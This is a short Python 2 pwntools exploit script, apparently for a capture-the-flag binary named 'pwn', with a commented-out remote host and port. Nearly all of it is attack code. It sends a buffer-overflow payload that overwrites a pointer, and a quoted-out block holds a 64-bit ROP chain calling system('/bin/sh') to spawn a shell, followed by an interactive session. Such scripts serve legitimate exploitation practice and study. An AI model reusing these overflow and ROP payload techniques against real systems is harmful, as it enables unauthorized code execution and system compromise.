#!/usr/bin/env python
# ------ Python2 ------
# By c10udlnk (https://github.com/c10udlnk)
# Enjoy it! 0v0

from __future__ import print_function
from pwn import *

# context.log_level = 'debug'
r = process("./pwn")
host = "106.54.97.9"
port = 10000
# r = remote(host,port)

getShell_addr = 0xA5A
payload = ""
payload += 'a'*(0x88-0x1c) + p32(0) + 'a'*16 + p32(0x804D794+4)
'''
libcInitdown_addr = 0x401232
libcInitup_addr = 0x401218
system_addr = 0x401040
binsh_addr = 0x402004
_rbx = 0
_rbp = 1
ori_addr = 0x4011D7
payload = ""
payload += 'a'*0x20 + 'b'*8 + p64(libcInitdown_addr)
payload += p64(_rbx) + p64(_rbp) + p64(binsh_addr)*3 + p64(system_addr) + p64(libcInitup_addr)
payload += p64(0)*7 + p64(ori_addr)
'''
r.sendline(payload)

r.interactive()